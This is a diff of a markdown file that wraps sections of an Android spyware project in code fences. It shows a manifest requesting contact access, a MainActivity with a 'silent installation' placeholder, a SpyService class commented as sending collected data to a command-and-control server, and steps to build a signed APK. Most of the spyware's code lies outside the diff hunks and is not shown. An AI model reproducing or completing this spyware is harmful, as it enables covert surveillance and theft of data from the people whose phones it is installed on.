@@ -2,7 +2,8 @@
 ![omicron](20260602_202149.png)
 ---
 ## AndroidManifest.xml:
-...
+
+```
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -43,9 +44,12 @@ public class MainActivity extends Activity {
         // Silent installation code
     }
 }
-...
+
+```
+
 ## SpyService.java:
-...
+
+```
 public class SpyService extends Service {
     private Handler handler = new Handler();
     private Runnable runnable = new Runnable() {
@@ -122,10 +126,11 @@ public class SpyService extends Service {
         // Send to command-and-control server
     }
 }
-...
+```
 ## Build Instructions:
 ## File -> New -> New Project -> Empty Activity
-...
+
+```
 Copy all files into respective folders
 Build -> Generate Signed Bundle / APK
-...
+```
